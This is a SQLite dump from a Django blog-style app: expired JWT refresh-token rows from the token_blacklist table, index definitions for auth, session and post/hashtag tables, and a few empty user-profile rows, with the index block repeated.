INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTMwNSwiaWF0IjoxNjg1Nzk4OTA1LCJqdGkiOiJiNGE2MDEyNTA1ZWI0YzgxYmU3MzUxODIyMWYwOWFlMSIsInVzZXJfaWQiOjF9.HSsWr22gmI7XtYNZF6D3egNLWjL6fJH7PBugNkSNqI0','2023-06-03 13:28:25.293002','2023-06-04 13:28:25',1,'b4a6012505eb4c81be73518221f09ae1',45);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTM2OSwiaWF0IjoxNjg1Nzk4OTY5LCJqdGkiOiI2Y2JlMzRhZGJiMTM0ZDc1YTE4ODdhNmI1Yzc1MDE5OSIsInVzZXJfaWQiOjF9.9gamWDavMUKcVzvS38EdIb-KM192xlPzsD2b4nCdpI4','2023-06-03 13:29:29.333123','2023-06-04 13:29:29',1,'6cbe34adbb134d75a1887a6b5c750199',46);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTM5MSwiaWF0IjoxNjg1Nzk4OTkxLCJqdGkiOiIyMWJmMjk2NDcxZmI0OWJhYTJhMWY2YTkxYjUwYTZkNSIsInVzZXJfaWQiOjF9.TakucHZ85-6Gs160zySpIMjRro_a-Q03poQ6MzDuV1o','2023-06-03 13:29:51.864611','2023-06-04 13:29:51',1,'21bf296471fb49baa2a1f6a91b50a6d5',47);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTUxNCwiaWF0IjoxNjg1Nzk5MTE0LCJqdGkiOiIwODk4OGUzNmE0ZjQ0MGJmYjYyOTU4YjAzOGU1ZGIwOCIsInVzZXJfaWQiOjF9.MAPxO8YX2BuKwGKL3RhXLXhsMbJ_XNCdQtPmFlYMM80','2023-06-03 13:31:54.838881','2023-06-04 13:31:54',1,'08988e36a4f440bfb62958b038e5db08',48);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTU0MCwiaWF0IjoxNjg1Nzk5MTQwLCJqdGkiOiIzNDRkYmNkMWYzZTU0NmY2YWNmMmM4Yzc3NjEyM2I1NCIsInVzZXJfaWQiOjF9.Hd0WcPq0DTpWHm_V-gq3HwBggcN7IG14UYqB6mCCTQM','2023-06-03 13:32:20.400046','2023-06-04 13:32:20',1,'344dbcd1f3e546f6acf2c8c776123b54',49);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg4NTU3MiwiaWF0IjoxNjg1Nzk5MTcyLCJqdGkiOiI3MTA0YmNhOTY0ODk0NTE3ODY1Y2Q5MGNkNDUwODBkZSIsInVzZXJfaWQiOjF9.-UyQZE377ljAL0uh21r7qV-as4dSbiDMr2odxRgHbyc','2023-06-03 13:32:52.543744','2023-06-04 13:32:52',1,'7104bca964894517865cd90cd45080de',50);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzA2MSwiaWF0IjoxNjg1ODA2NjYxLCJqdGkiOiJiYjQyZTA5N2E5YmY0YmNiYTQ3OTdhMjI1NzA4NmFjYSIsInVzZXJfaWQiOjJ9.C3ehQUZsKnA8IaJNjubcGxNzrfgITdl11HvDBm5G6ys','2023-06-03 15:37:41.186370','2023-06-04 15:37:41',2,'bb42e097a9bf4bcba4797a2257086aca',51);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzI3MywiaWF0IjoxNjg1ODA2ODczLCJqdGkiOiIzNmM5ZWQ3ZGJhOWM0MzRlODNiYzkyNWIzYzFiNmMzZSIsInVzZXJfaWQiOjJ9.GjZ73obRB1of4ENO6jdR5IxIPplFDNgtvny3DHr16us','2023-06-03 15:41:13.538621','2023-06-04 15:41:13',2,'36c9ed7dba9c434e83bc925b3c1b6c3e',52);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzMyMywiaWF0IjoxNjg1ODA2OTIzLCJqdGkiOiIyOWEwNTAzYzBhNWQ0MTYxYjUxYWExOGI4MWY4OGIzZiIsInVzZXJfaWQiOjJ9.0ycL_vpkg99BRD_At4Eqsmc1FPMYdXPlzjoylmaZI4Q','2023-06-03 15:42:03.721554','2023-06-04 15:42:03',2,'29a0503c0a5d4161b51aa18b81f88b3f',53);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzMyOCwiaWF0IjoxNjg1ODA2OTI4LCJqdGkiOiJkYjYyODVjMjMxZGE0YjdmYTk4YzUxNTFkYTNhZjlhMiIsInVzZXJfaWQiOjJ9.k81NLmGBJC6BAwFCxwZVOfzm4Q01tje0NaXFKE4ZUGQ','2023-06-03 15:42:08.391874','2023-06-04 15:42:08',2,'db6285c231da4b7fa98c5151da3af9a2',54);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzMzMSwiaWF0IjoxNjg1ODA2OTMxLCJqdGkiOiJkZDJkNzg1OGFjMTI0YjdjYTJkMTFhNDI5YWVlYTNkZiIsInVzZXJfaWQiOjJ9.p5A7dXxk-uKwWYMD15pcefwz_pxzjMINMJCR6SlUzB8','2023-06-03 15:42:11.381280','2023-06-04 15:42:11',2,'dd2d7858ac124b7ca2d11a429aeea3df',55);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzM1MywiaWF0IjoxNjg1ODA2OTUzLCJqdGkiOiJkZjZmZTEwZTc3M2Q0MTM1OTkwM2FkNThhN2JmZGVmOSIsInVzZXJfaWQiOjJ9.p8pQ5wZUgfi33tByXuDv9-cdPMdYSKqA9nrbWhRPUUg','2023-06-03 15:42:33.177559','2023-06-04 15:42:33',2,'df6fe10e773d41359903ad58a7bfdef9',56);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzM4OSwiaWF0IjoxNjg1ODA2OTg5LCJqdGkiOiIxOGJiY2I2N2Y4YTI0MDNiYTUyYzVkZmI0YzM2Y2NhZSIsInVzZXJfaWQiOjN9.8p78JpyBDbHH26YDIlfTrhgqlfyXIIEk4fqgJ_e-wtY','2023-06-03 15:43:09.358731','2023-06-04 15:43:09',3,'18bbcb67f8a2403ba52c5dfb4c36ccae',57);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5MzM5OSwiaWF0IjoxNjg1ODA2OTk5LCJqdGkiOiJhYmJkOGJmODhlODE0OTZkODM5NTIxZGI4ZmUyZTA1MyIsInVzZXJfaWQiOjN9.uE-vi-cjkNCwOjX6NyW9_jnDFSQXSG44NtAiN8927OA','2023-06-03 15:43:19.287947','2023-06-04 15:43:19',3,'abbd8bf88e81496d839521db8fe2e053',58);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5NTM0NywiaWF0IjoxNjg1ODA4OTQ3LCJqdGkiOiI3NDQyODc2ZjM0NTM0MDgzYTIzYTkyOTJiYzU1ZTgxOCIsInVzZXJfaWQiOjJ9.NYewEYI4eGJLQcfGO0As6vsmXjfs0K6TqDB8tgrBSl8','2023-06-03 16:15:47.805847','2023-06-04 16:15:47',2,'7442876f34534083a23a9292bc55e818',59);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5NTc5MiwiaWF0IjoxNjg1ODA5MzkyLCJqdGkiOiJjYjc2OGFkNGI2NTc0NjE4ODllMjZhYWQxZDBjYjQxOCIsInVzZXJfaWQiOjJ9.RjJXJscrqdLfY351OO4BMfCKROjeCnsNYMxvE5EI7mU','2023-06-03 16:23:12.108529','2023-06-04 16:23:12',2,'cb768ad4b657461889e26aad1d0cb418',60);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5NjAzNSwiaWF0IjoxNjg1ODA5NjM1LCJqdGkiOiJhZDdmMGM0ZmE3ODc0ZTU2YmEzYjdiYTQ4ZjAwNjczNSIsInVzZXJfaWQiOjR9.vfwghIaPAaajD9TKukeKTUA625kwjTsDZw1Z68QUOLk','2023-06-03 16:27:15.674652','2023-06-04 16:27:15',4,'ad7f0c4fa7874e56ba3b7ba48f006735',61);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5NjA1MSwiaWF0IjoxNjg1ODA5NjUxLCJqdGkiOiIwZGZjMmRhY2YxNzM0YjZiOGY0ODg5MzNlMTZmNWIzYSIsInVzZXJfaWQiOjR9.FZm4m5JPjROYpIAZ2WNDQWJkNt2ac7FMIi9wp2O7yMc','2023-06-03 16:27:31.386746','2023-06-04 16:27:31',4,'0dfc2dacf1734b6b8f488933e16f5b3a',62);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5OTE3NywiaWF0IjoxNjg1ODEyNzc3LCJqdGkiOiI5ZWEzZWRmMmYyYTM0ZGM3YTU0NzU5ZWNkNDVkNjgwMiIsInVzZXJfaWQiOjJ9.bZO6DDkCfJZmSlTlUjIWt9FE2b62DgAowaITAeevdHc','2023-06-03 17:19:37.637480','2023-06-04 17:19:37',2,'9ea3edf2f2a34dc7a54759ecd45d6802',63);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5OTI1MCwiaWF0IjoxNjg1ODEyODUwLCJqdGkiOiIxYmY3MWYyOGNlZWI0MWM0YWM3OTE0ODgyNjExMjMwNCIsInVzZXJfaWQiOjJ9.VZrC8ws51bhxeIdKPTETRNKUURJ4TUk47n8iFZVRqxU','2023-06-03 17:20:50.235598','2023-06-04 17:20:50',2,'1bf71f28ceeb41c4ac79148826112304',64);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5OTQ3MywiaWF0IjoxNjg1ODEzMDczLCJqdGkiOiI5NTBlZjBhODg1Njg0NTYyYWMyNDQwYjU3OWM0NjU4YSIsInVzZXJfaWQiOjJ9.EPQEbAp7zlcCDBfNN6U4Cy0wnbkD-4lFrU20VaBuCmU','2023-06-03 17:24:33.237789','2023-06-04 17:24:33',2,'950ef0a885684562ac2440b579c4658a',65);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTg5OTc3MiwiaWF0IjoxNjg1ODEzMzcyLCJqdGkiOiI1NTU1MzM0ZDBlYjc0OTRjYjAwMDc0MmU0OWMyYWI0YyIsInVzZXJfaWQiOjJ9.8aCwetGb0rLnzHyKGbmbc5MqgCmRGgcAeCJ5Y-5TjlQ','2023-06-03 17:29:32.560012','2023-06-04 17:29:32',2,'5555334d0eb7494cb000742e49c2ab4c',66);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMDk5MSwiaWF0IjoxNjg1ODE0NTkxLCJqdGkiOiJjOGQ4M2U1NDRlMmE0YjgxOTE1ZTZjMTQwZDU1YjVmMSIsInVzZXJfaWQiOjJ9.Hw3WKiMvGSrB2mRYKen0nTSO_SypFY3dFjzhWuNxjG4','2023-06-03 17:49:51.477726','2023-06-04 17:49:51',2,'c8d83e544e2a4b81915e6c140d55b5f1',67);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMTUyMywiaWF0IjoxNjg1ODE1MTIzLCJqdGkiOiI4ZjFmZTg5MWQ4Yzk0MGJkYjcyODg5OWQwY2IzN2ZhMiIsInVzZXJfaWQiOjJ9.BjtB91UEX_FoWGIa5RqZmnwJDEq3JjRvXFIrV4F0hIo','2023-06-03 17:58:43.998181','2023-06-04 17:58:43',2,'8f1fe891d8c940bdb728899d0cb37fa2',68);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMTY1OSwiaWF0IjoxNjg1ODE1MjU5LCJqdGkiOiI2ZTgzY2VmMTg3ZmQ0NWVjYTE2ZDhjNDZmNDgxNDFlNyIsInVzZXJfaWQiOjJ9.ZxdnHzGI-Xuon47vmqxbqz9UsdamfC4RexY9bd97e4A','2023-06-03 18:00:59.663438','2023-06-04 18:00:59',2,'6e83cef187fd45eca16d8c46f48141e7',69);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMjAyNCwiaWF0IjoxNjg1ODE1NjI0LCJqdGkiOiJlYzEwMGY1NmI1OWY0YWUzOTkxMTk5NGFhYWJkN2Q3MSIsInVzZXJfaWQiOjJ9.DuwqedylFh5AnZrsxz73-Sf63B3jL6a6w_ZMZ4XERq0','2023-06-03 18:07:04.869307','2023-06-04 18:07:04',2,'ec100f56b59f4ae39911994aaabd7d71',70);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMjAzMCwiaWF0IjoxNjg1ODE1NjMwLCJqdGkiOiJhNzdlYTdkMTY1MGI0YzgzOGQxOTJlYjNmMzNmMDNjYiIsInVzZXJfaWQiOjJ9.ZxcjH1kx_WZ--lzWZcB782r_yfoQ9T5-acCBATi_YZI','2023-06-03 18:07:10.221917','2023-06-04 18:07:10',2,'a77ea7d1650b4c838d192eb3f33f03cb',71);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMjAzMiwiaWF0IjoxNjg1ODE1NjMyLCJqdGkiOiJiODdmNWMwNTYzYTQ0YzNkYjBhYTI3YjhkNjdhNjMzMiIsInVzZXJfaWQiOjJ9.Z0jt6vT6-87MpoDL5l_Zdiym5uWqGLqO9FiCW7iIYcg','2023-06-03 18:07:12.583045','2023-06-04 18:07:12',2,'b87f5c0563a44c3db0aa27b8d67a6332',72);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMjAzNCwiaWF0IjoxNjg1ODE1NjM0LCJqdGkiOiIzZTRjYzVmNzg4MTA0ZDg3YTQ4MjdiZjJiYzdiZjNmYyIsInVzZXJfaWQiOjJ9.aj6Cij_zZzDOr__Ssnb4-4MZxWOKHwS1as_pjMYu0mo','2023-06-03 18:07:14.760924','2023-06-04 18:07:14',2,'3e4cc5f788104d87a4827bf2bc7bf3fc',73);
INSERT INTO "token_blacklist_outstandingtoken" VALUES('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoicmVmcmVzaCIsImV4cCI6MTY4NTkwMjA2NiwiaWF0IjoxNjg1ODE1NjY2LCJqdGkiOiI2ZjA0MGI4NDhhMTA0ZGI3ODdjMWJhMjc2OTVhZGQ2NiIsInVzZXJfaWQiOjJ9.1YRW3Z4RXvv09eXyXdiUHlU3N1ljyOTkvFJ7fgHaxxI','2023-06-03 18:07:46.874518','2023-06-04 18:07:46',2,'6f040b848a104db787c1ba27695add66',74);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
CREATE TABLE IF NOT EXISTS "user_profile_userprofile" ("id" integer NOT NULL PRIMARY KEY AUTOINCREMENT, "phone" varchar(20) NOT NULL, "city" varchar(20) NOT NULL, "first_name" varchar(255) NOT NULL, "last_name" varchar(255) NOT NULL, "updated_date" datetime NOT NULL, "user_id" integer NOT NULL UNIQUE REFERENCES "auth_user" ("id") DEFERRABLE INITIALLY DEFERRED);
INSERT INTO "user_profile_userprofile" VALUES(1,'','','','','2023-06-01 00:03:45.096045',2);
INSERT INTO "user_profile_userprofile" VALUES(2,'','','','','2023-06-03 15:43:09.354347',3);
INSERT INTO "user_profile_userprofile" VALUES(3,'','','','','2023-06-03 16:27:15.668781',4);
CREATE UNIQUE INDEX "auth_group_permissions_group_id_permission_id_0cd325b0_uniq" ON "auth_group_permissions" ("group_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_group_id_b120cbf9" ON "auth_group_permissions" ("group_id");
CREATE INDEX IF NOT EXISTS "auth_group_permissions_permission_id_84c5c92e" ON "auth_group_permissions" ("permission_id");
CREATE UNIQUE INDEX "auth_permission_content_type_id_codename_01ab375a_uniq" ON "auth_permission" ("content_type_id", "codename");
CREATE INDEX IF NOT EXISTS "auth_permission_content_type_id_2f476e4b" ON "auth_permission" ("content_type_id");
CREATE UNIQUE INDEX "auth_user_groups_user_id_group_id_94350c0c_uniq" ON "auth_user_groups" ("user_id", "group_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_user_id_6a12ed8b" ON "auth_user_groups" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_groups_group_id_97559544" ON "auth_user_groups" ("group_id");
CREATE UNIQUE INDEX "auth_user_user_permissions_user_id_permission_id_14a6b632_uniq" ON "auth_user_user_permissions" ("user_id", "permission_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_user_id_a95ead1b" ON "auth_user_user_permissions" ("user_id");
CREATE INDEX IF NOT EXISTS "auth_user_user_permissions_permission_id_1fbb5f2c" ON "auth_user_user_permissions" ("permission_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_content_type_id_c4bce8eb" ON "django_admin_log" ("content_type_id");
CREATE INDEX IF NOT EXISTS "django_admin_log_user_id_c564eba6" ON "django_admin_log" ("user_id");
CREATE UNIQUE INDEX "django_content_type_app_label_model_76bd3d3b_uniq" ON "django_content_type" ("app_label", "model");
CREATE INDEX IF NOT EXISTS "django_session_expire_date_a5c62663" ON "django_session" ("expire_date");
CREATE INDEX IF NOT EXISTS "sections_category_parent_96fdf671" ON "sections_category" ("parent");
CREATE UNIQUE INDEX "sections_hashtag_post_hashtag_id_post_id_2d6f0c2d_uniq" ON "sections_hashtag_post" ("hashtag_id", "post_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_hashtag_id_7b51c385" ON "sections_hashtag_post" ("hashtag_id");
CREATE INDEX IF NOT EXISTS "sections_hashtag_post_post_id_ea3affd7" ON "sections_hashtag_post" ("post_id");
CREATE INDEX IF NOT EXISTS "sections_post_category_id_96eb7da2" ON "sections_post" ("category_id");
CREATE INDEX IF NOT EXISTS "token_blacklist_outstandingtoken_user_id_83bc629a" ON "token_blacklist_outstandingtoken" ("user_id");
